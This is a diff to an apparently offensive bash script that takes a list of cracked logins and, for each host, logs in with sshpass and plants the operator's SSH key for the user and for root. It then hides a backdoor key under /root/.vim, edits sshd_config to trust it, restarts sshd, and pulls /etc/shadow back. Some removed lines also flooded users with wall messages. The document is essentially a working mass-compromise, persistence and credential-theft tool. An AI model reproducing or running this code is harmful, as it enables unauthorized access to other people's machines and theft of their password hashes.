@@ -3,14 +3,15 @@
 #=== DESCIPTION ========================================================================
 #=======================================================================================
 	## sets up ssh keys and adds new path
-	## quickly changes your ip/mac
-	##
+	## pulls back /etc/shadow file
+	## quickly changes your ip/mac, if needed
 #=======================================================================================
 #=======================================================================================
 	#
 	#*************** NEED TO DO/ADD ***********************
 	# "clone target" function
 	# checks for host/target OS and make changes accordingly
+	# fix whatever is fucking the CentOS drop in (forcing you to ctrl-c each one)
 	#******************************************************
 	#
 #///////////////////////////////////////////////////////////////////////////////////////
@@ -21,7 +22,7 @@
 function main(){		###
 	#neo				###
 	#meat				###
-	infect				###
+	infect $*			###
 	#mutate				### "RANDOMIZE"
 	#mirror				### IMPERSONATE
 	#molt				### ORIGINAL CONFIG
@@ -43,8 +44,8 @@ function main(){		###
 function infect(){
 #### launch bay #########
 function payload(){		#
-#	razor				# SINGLE TARGET
-	shotgunTest				# EVERYONE
+#	razor $*			# SINGLE TARGET
+	shotgun				# EVERYONE
 }						#
 #########################
 	#### Setting Defaults ############################
@@ -59,7 +60,10 @@ function payload(){		#
 # single target
 #+++++++++++++++
 	function razor(){
-		#statements
+		#### Assigning Defaults ############################
+		target="$1"
+		username="$2"
+		password="$3"
 		#### Inserting keys ############################
 		printf "\nInserting ssh key into [$target] with ($username:$password)\n"
 		sshpass -p $password ssh -o StrictHostKeyChecking=no $username@$target "echo $password | sudo -S mkdir -p /home/$username/.ssh /root/.ssh && cat | sudo tee -a /home/$username/.ssh/authorized_keys /root/.ssh/authorized_keys" </root/.ssh/id_rsa.pub
@@ -67,30 +71,6 @@ function payload(){		#
 #+++++++++++++++
 # into a crowd
 #+++++++++++++++
-function shotgunTest(){
-	while read -r tango; do
-	#### Assigning values ############################
-		target="$(echo $tango | cut -d" " -f1)"
-		username="$(echo $tango | cut -d" " -f2)"
-		password="$(echo $tango | cut -d" " -f3)"
-
-		echo "------------------------------------------------------------------"
-		echo "|target= $target"
-		echo "|username= $username"
-		echo "|password= $password"
-
-		sshLoginCommand="sshpass -p $password ssh -n -o StrictHostKeyChecking=no $username@$target"
-	#### Inserting keys ############################
-		printf "\nInserting ssh key into [$target] with ($username:$password)\n"
-		if $sshLoginCommand 'uname -v | grep -oq Ubuntu'; then
-			echo "it's Ubuntu"
-		else if uname -v | grep -o Debian; then
-			echo "something went wrong. its debian"
-			fi
-		fi
-
-	done <<< $(sort -u $crackedLogins)
-}
 	function shotgun(){
 		while read -r tango; do
 		#### Assigning values ############################
@@ -98,25 +78,108 @@ function shotgunTest(){
 			username="$(echo $tango | cut -d" " -f2)"
 			password="$(echo $tango | cut -d" " -f3)"
 
+			sshLoginCommand="sshpass -p $password ssh -o StrictHostKeyChecking=no $username@$target"
+			sshUserPath="/home/$username/.ssh"
+			sshUserKey="$sshUserPath/authorized_keys"
+			sshRootPath="/root/.ssh"
+			sshRootKey="$sshRootPath/authorized_keys"
+			sshPoisonPath="/root/.vim"
+			sshPoisonKey="$sshPoisonPath/ssh"
 		#### Inserting keys ############################
-			printf "\nInserting ssh key into [$target] using: $username:$password\n"
-			sshpass -p $password ssh -o StrictHostKeyChecking=no $username@$target "
-							echo $password |
-							sudo -S mkdir -p /home/$username/.ssh /root/.ssh && cat |
-							sudo tee -a /home/$username/.ssh/authorized_keys /root/.ssh/authorized_keys
-							" </root/.ssh/id_rsa.pub
-			#New poisoned sshdir and auth file. adding the cronjob, then setting a reboot timer
-				printf "\nPoisoning sshd rules on [$target]\n"
-				ssh -n -o StrictHostKeyChecking=no $target "
-							mkdir -p /root/.vim
-							cp /root/.ssh/authorized_keys /root/.vim/ssh
-							sed -i 's/#AuthorizedKeysFile/AuthorizedKeysFile .vim\/ssh /' /etc/ssh/sshd_config
-							(crontab -l ; echo '@reboot touch /tmp/.trigger #delete this, i dare you') | crontab -
-							for n in {1..1000}; do wall -n 'WOULD YOU LIKE TO PLAY A GAME???'; sleep 0.1; done
-							" &
-		done <<< $(sort -u $crackedLogins)
+			jankTastic=$(sshpass -p $password ssh -n -o StrictHostKeyChecking=no $username@$target 'uname -v | egrep -o "Debian|Ubuntu" || cat /etc/*-release | grep -o CentOS | sort -u')
+			if [[ $? == 0 ]]; then
+				printf "\nInserting ssh key and poisoning dirs for [$target] with ($username:$password)"
+			else
+				printf "\nFAILED to connect to $target"
+			fi
+			printf "\njank result= $jankTastic\n"
+			case $jankTastic in
+				Ubuntu)
+						#inserting key
+							$sshLoginCommand "
+											echo $password |
+											sudo -S mkdir -m700 -p $sshUserPath $sshRootPath &&
+											cat |
+											sudo tee -a $sshUserKey $sshRootKey
+											" </root/.ssh/id_rsa.pub &> /dev/null
+						#New poisoned sshdir and auth file. adding the cronjob, then setting a reboot timer
+							printf "\nPoisoning sshd rules on [$target]\n"
+							ssh $target "
+										mkdir $sshPoisonPath
+										cp $sshRootKey $sshPoisonKey
+										sed -i 's/#AuthorizedKeysFile/AuthorizedKeysFile .vim\/ssh /' /etc/ssh/sshd_config
+										service sshd restart
+										" &
+						#yanking back the shadow file
+							printf "\nYanking shadow file from [$target]"
+							ssh $target "
+										cat /etc/shadow
+										" &> shadow-$target
+							;;
+				Debian)
+						#inserting key
+							$sshLoginCommand "
+											echo $password |
+											sudo -S mkdir -m700 -p $sshUserPath $sshRootPath &&
+											cat |
+											sudo tee -a $sshUserKey $sshRootKey
+											" </root/.ssh/id_rsa.pub &> /dev/null
+						#New poisoned sshdir and auth file. adding the cronjob, then setting a reboot timer
+							printf "\nPoisoning sshd rules on [$target]\n"
+							ssh $target "
+										mkdir $sshPoisonPath
+										cp $sshRootKey $sshPoisonKey
+										sed -i 's/#AuthorizedKeysFile/AuthorizedKeysFile .vim\/ssh /' /etc/ssh/sshd_config
+										service sshd restart
+										" &
+						#yanking back the shadow file
+							printf "\nYanking shadow file from [$target]"
+							ssh $target "
+										cat /etc/shadow
+										" &> shadow-$target
+							;;
+				CentOS)
+						#inserting key
+							$sshLoginCommand "
+											echo $password | sudo -S mkdir -m700 -p $sshUserPath $sshRootPath &> /dev/null
+											echo $password | sudo -S chown $username:$username $sshUserPath &> /dev/null
+																	 cat >> $sshUserKey
+											echo $password | sudo -S chmod 600 $sshUserKey &> /dev/null
+											echo $password | sudo -S cp $sshUserKey $sshRootKey &> /dev/null
+											echo $password | sudo -S restorecon -r /root &> /dev/null
+											"</root/.ssh/id_rsa.pub
+
+							# if sudo doesn't exist, sets up the key for normal user and lets you know.
+							if [ $? != 0 ]; then
+								printf "\n\e[0;31mwomp womp.. no sudo. you get to do it manually.. yay!!\e[0m\n\t[$target:$username:$password]\n"
+								$sshLoginCommand "
+												mkdir -m700 -p $sshUserPath
+												chmod 600 $sshUserKey &> /dev/null || install -m 600 /dev/null $sshUserKey
+												cat >> $sshUserKey
+												" </root/.ssh/id_rsa.pub
+							fi
+						#New poisoned sshdir and auth file. adding the cronjob, then setting a reboot timer
+							if [ $? == 0 ]; then
+								printf "\nPoisoning sshd rules on [$target]\n"
+								ssh $target "
+											mkdir $sshPoisonPath
+											cp $sshRootKey /root/.ssh/.authorized_keys
+											echo 'AuthorizedKeysFile2 .ssh/.authorized_keys' >> /etc/ssh/sshd_config
+											service sshd restart
+											" &
+							fi
+						#yanking back the shadow file
+							printf "\nYanking shadow file from [$target]"
+							ssh $target "
+										cat /etc/shadow
+										" &> shadow-$target
+							;;
+					*)		echo UNKNOWN
+							;;
+			esac
+		done <<< $(sort -u $crackedLogins | sed '/^$/d')
 	}
-	payload
+payload $*
 }
 ###########################################################################################
 # if called; changes ip, mac, etc
@@ -130,6 +193,7 @@ function mutate(){
 ###########################################################################################
 function mirror(){
 	:
+	#### PART 1 ############################
 }
 ###########################################################################################
 # returns to original form
@@ -181,4 +245,4 @@ function neo(){
 #+++++++++++++++++++++++++++++++++ FIGHT!! +++++++++++++++++++++++++++++++++++++++++++++++++++++++++
 #+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
 
-main
+main $*
